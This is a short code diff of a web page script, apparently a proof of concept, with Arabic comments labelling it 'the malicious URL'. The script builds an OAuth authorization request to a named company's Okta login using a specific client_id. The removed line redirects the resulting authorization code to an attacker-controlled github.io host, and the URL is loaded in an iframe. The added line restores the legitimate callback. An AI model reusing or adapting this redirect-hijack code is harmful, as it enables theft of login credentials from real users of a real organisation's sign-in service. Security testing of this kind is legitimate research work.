@@ -156,7 +156,7 @@
     <script>
         // بناء الـ URL الخبيث
         const githubUsername = window.location.hostname.split('.')[0]; // هياخد username تلقائي
-        const maliciousUrl = `https://anduril.okta.com/oauth2/v1/authorize?client_id=0oa1p85y61NjjJU3q4h7&redirect_uri=https://aplogviewer.anduril.dev.${githubUsername}.github.io/callback&response_type=code&scope=openid&state=poc_attack&nonce=12345`;
+        const maliciousUrl = `https://anduril.okta.com/oauth2/v1/authorize?client_id=0oa1p85y61NjjJU3q4h7&redirect_uri=https://aplogviewer.anduril.dev/login&response_type=code&scope=openid&state=poc_attack&nonce=12345`;
         
         // تحميل الـ iframe
         setTimeout(() => {
